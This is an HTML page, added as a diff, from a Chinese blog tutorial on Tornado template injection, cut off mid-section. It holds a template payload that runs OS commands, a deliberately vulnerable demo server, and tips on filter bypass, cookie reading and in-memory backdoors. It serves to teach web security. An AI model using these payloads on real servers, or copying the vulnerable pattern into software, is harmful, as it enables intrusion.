@@ -1,0 +1,591 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>tornado模板注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">开发基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E6%88%90%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">组成结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">框架使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-x2F-%E8%BE%93%E5%87%BA%E5%86%85%E5%AE%B9%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">获取&#x2F;输出内容的方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">模板语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-number">2.4.</span> <span class="toc-text">模板渲染</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTTPServerRequest"><span class="toc-number">3.1.</span> <span class="toc-text">利用HTTPServerRequest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Application"><span class="toc-number">3.2.</span> <span class="toc-text">利用 Application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-RequestHandler"><span class="toc-number">3.3.</span> <span class="toc-text">利用 RequestHandler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">3.3.1.</span> <span class="toc-text">绕过字符限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%87%BA%E5%9B%9E%E6%98%BE"><span class="toc-number">3.3.2.</span> <span class="toc-text">带出回显</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">4.</span> <span class="toc-text">构造payload</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>tornado模板注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/6
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/SSTI/" style="color: #03a9f4">SSTI</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/python/" style="color: #00bcd4">python</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Tornado官方文档：<a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/intro.html">https://tornado-zh.readthedocs.io/zh/latest/guide/intro.html</a></p>
+<p>简单的说就是一个python web框架模板，那么也就存在着模板注入这一说</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12260">https://xz.aliyun.com/t/12260</a></p>
+<span id="more"></span>
+
+<h1 id="开发基础"><a href="#开发基础" class="headerlink" title="开发基础"></a>开发基础</h1><h2 id="组成结构"><a href="#组成结构" class="headerlink" title="组成结构"></a>组成结构</h2><p>Tornado 大体上可以被分为4个主要的部分:</p>
+<ul>
+<li>web框架 (包括创建web应用的 <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.RequestHandler"><code>RequestHandler</code></a> 类，还有很多其他支持的类).</li>
+<li>HTTP的客户端和服务端实现 (<a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/httpserver.html#tornado.httpserver.HTTPServer"><code>HTTPServer</code></a> and <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/httpclient.html#tornado.httpclient.AsyncHTTPClient"><code>AsyncHTTPClient</code></a>).</li>
+<li>异步网络库 (<a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/ioloop.html#tornado.ioloop.IOLoop"><code>IOLoop</code></a> and <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/iostream.html#tornado.iostream.IOStream"><code>IOStream</code></a>), 为HTTP组件提供构建模块，也可以用来实现其他协议.</li>
+<li>协程库 (<a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/gen.html#module-tornado.gen"><code>tornado.gen</code></a>) 允许异步代码写的更直接而不用链式回调的方式.</li>
+</ul>
+<p>看得出来这个框架很强调”异步“这一概念，这里介绍一下异步是什么：</p>
+<ul>
+<li>首先我们得先了解”同步“，”同步模式”就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的.</li>
+<li>“异步模式”则完全不同，每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。 “异步模式”非常重要。</li>
+<li>异步的用处：浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应。这样可以大大缩小服务器处理问题的时间。</li>
+</ul>
+<h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># _*_ coding:utf-8 _*_</span>
+__author__ <span class="token operator">=</span> <span class="token string">"charles"</span>
+
+<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop
+<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
+<span class="token keyword">class</span> <span class="token class-name">MainHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># self.write("Hello, world")</span>
+        self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">"s1.html"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment">#表单以post方式提交</span>
+        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span>
+settings <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">"template_path"</span><span class="token punctuation">:</span><span class="token string">"template"</span><span class="token punctuation">,</span>     <span class="token comment">#模版路径的配置</span>
+    <span class="token string">"static_path"</span><span class="token punctuation">:</span><span class="token string">'static'</span><span class="token punctuation">,</span>          <span class="token comment">#静态文件配置</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">#路由映射，路由系统</span>
+application <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span>       <span class="token comment">#创建对象</span>
+    <span class="token punctuation">(</span><span class="token string">r"/index"</span><span class="token punctuation">,</span> MainHandler<span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">**</span>settings<span class="token punctuation">)</span>                               <span class="token comment">#将settings注册到路由系统，这样配置才会生效</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    application<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span>                    <span class="token comment">#创建socket，一直循环</span>
+    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>instance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">#使用epoll,io多路复用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="获取-x2F-输出内容的方法"><a href="#获取-x2F-输出内容的方法" class="headerlink" title="获取&#x2F;输出内容的方法"></a>获取&#x2F;输出内容的方法</h3><p>get请求是<code>get_query_argument(s)</code>，post请求是<code>get_argument(s)</code>，有无s的差距是要获取的是字符串还是列表</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 获取的是字符串，默认取最后一个name的值</span>
+    self<span class="token punctuation">.</span>get_query_argument<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>
+    <span class="token comment"># 获取的是列表，存放所有的name的值</span>
+    self<span class="token punctuation">.</span>get_query_arguments<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 获取的是字符串，取最后一个name的值</span>
+    data1 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>
+    <span class="token comment"># 获取的是列表，如果url后边跟上name参数会将该name参数的值也放入列表中</span>
+    data2 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_arguments<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>
+    <span class="token comment"># 获取所有的参数</span>
+    data3 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>arguments
+
+    <span class="token comment"># 如果请求没有传递headers = &#123;</span>
+    <span class="token comment">#     "Content-type": "application/x-www-form-urlencoded;",</span>
+    <span class="token comment"># &#125;</span>
+    <span class="token comment"># 获取json数据, 我们必须先从body中获取参数解码，然后转换为dict对象</span>
+    <span class="token comment"># 才能调用get_body_argument 和 get_body_arguments 方法获取json参数</span>
+    <span class="token comment"># 如果请求头传递了headers，我们可以直接使用get_body_argument获取参数</span>
+    param <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>param<span class="token punctuation">)</span>
+    data4 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_body_argument<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>
+    data5 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_body_arguments<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出用<code>write</code>方法，因为tornado为长连接，所以可以连续写多个write方法，将内容连接起来</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>template <span class="token keyword">as</span> template
+
+payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;7*7&#125;&#125;"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>template<span class="token punctuation">.</span>Template<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不用多说我们都知道这样子会返回49</p>
+<p>我们的payload语法上其实会和jinja模板有不少重合，这里挑几个比较重要的来讲讲</p>
+<p><code>&#123;&#123;&#125;&#125;</code>：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过html编码</p>
+<p><code>&#123;% apply *function* %&#125;...&#123;% end %&#125;</code>：用于执行函数，<code>function</code> 是函数名。<code>apply</code> 到 <code>end</code> 之间的内容是函数的参数</p>
+<p>测试一下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>template <span class="token keyword">as</span> template
+
+payload <span class="token operator">=</span> <span class="token string">"&#123;% apply __import__('os').system('calc') %&#125;&#123;% end %&#125;"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>template<span class="token punctuation">.</span>Template<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/12/06/tornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231206165101891.png" alt="image-20231206165101891"></p>
+<p><code>&#123;% from * import * %&#125;</code>，<code>&#123;% import *module* %&#125;</code>：等价于import</p>
+<p><code>&#123;%if%&#125;...&#123;%elif%&#125;...&#123;%else%&#125;...&#123;%end%&#125;</code>：等价于if</p>
+<hr>
+<h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><p>两个模板渲染函数render和render_string</p>
+<p>我们能进行ssti注入的地方就是在这个函数上面</p>
+<hr>
+<h1 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h1><p>demo：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop
+<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
+<span class="token keyword">from</span> tornado<span class="token punctuation">.</span>template <span class="token keyword">import</span> Template
+
+<span class="token keyword">class</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">.</span>_template_loaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#清空模板引擎</span>
+
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+app <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span>
+tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>current<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：对于 Tornado 来说，一旦 <code>self.render</code> 之后，就会实例化一个 <code>tornado.template.Loader</code>，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 <code>tornado.web.RequestHandler._template_loaders</code> 清空。否则在利用的时候，会一直用的第一个传入的 payload。</p>
+<p>这种写法会引入新变量：</p>
+<p><code>tornado.httputil.HTTPServerRequest</code>：与http请求相关</p>
+<p><code>tornado.web.RequestHandler</code>：表示当前请求的url是谁处理的</p>
+<p>这两个类中的属性是我们利用的重点</p>
+<hr>
+<h2 id="利用HTTPServerRequest"><a href="#利用HTTPServerRequest" class="headerlink" title="利用HTTPServerRequest"></a>利用HTTPServerRequest</h2><p>绕过字符限制：</p>
+<ul>
+<li><code>request.query</code>：包含 get 参数</li>
+<li><code>request.query_arguments</code>：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）</li>
+<li><code>request.arguments</code>：包含 get、post 参数，返回所有参数组成的字典</li>
+<li><code>request.body</code>：包含 post 参数</li>
+<li><code>request.body_arguments</code>：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）</li>
+<li><code>request.cookies</code>：就是 cookie</li>
+<li><code>request.files</code>：上传的文件</li>
+<li><code>request.headers</code>：请求头</li>
+<li><code>request.full_url</code>：完整的 url</li>
+<li><code>request.uri</code>：包含 get 参数的 url。有趣的是，直接 <code>str(requests)</code> 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 <code>.</code> 或者 <code>getattr</code> 之类的函数了。</li>
+<li><code>request.host</code>：Host 头</li>
+<li><code>request.host_name</code>：Host 头</li>
+</ul>
+<hr>
+<h2 id="利用-Application"><a href="#利用-Application" class="headerlink" title="利用 Application"></a>利用 Application</h2><ul>
+<li>Application.settings：web 服务的配置，可能会泄露一些敏感的配置</li>
+<li>Application.add_handlers：新增一个服务处理逻辑，可用于制作内存马，后面会一起说</li>
+<li>Application.wildcard_router.add_rules：新增一个 url 处理逻辑，可用于制作内存马</li>
+<li>Application.add_transform：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马</li>
+</ul>
+<hr>
+<h2 id="利用-RequestHandler"><a href="#利用-RequestHandler" class="headerlink" title="利用 RequestHandler"></a>利用 RequestHandler</h2><p>handler更为灵活一些</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'yu'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token operator">//</span>比如传入?yu<span class="token operator">=</span><span class="token number">123</span>则返回值为<span class="token number">123</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>  <span class="token operator">//</span>返回cookie值
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>get_cookie<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>  <span class="token operator">//</span>返回cookie中data的值
